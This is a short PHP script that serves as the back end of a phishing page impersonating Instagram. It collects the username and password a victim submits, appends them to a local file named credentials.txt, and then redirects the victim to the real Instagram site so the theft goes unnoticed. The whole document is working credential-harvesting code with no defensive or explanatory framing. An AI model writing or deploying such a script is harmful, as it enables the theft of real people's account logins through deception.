<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $entry = "Instagram | Username: $username | Password: $password" . PHP_EOL;
    file_put_contents("credentials.txt", $entry, FILE_APPEND | LOCK_EX);

    // Redirect to real Instagram
    header("Location: https://instagram.com");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
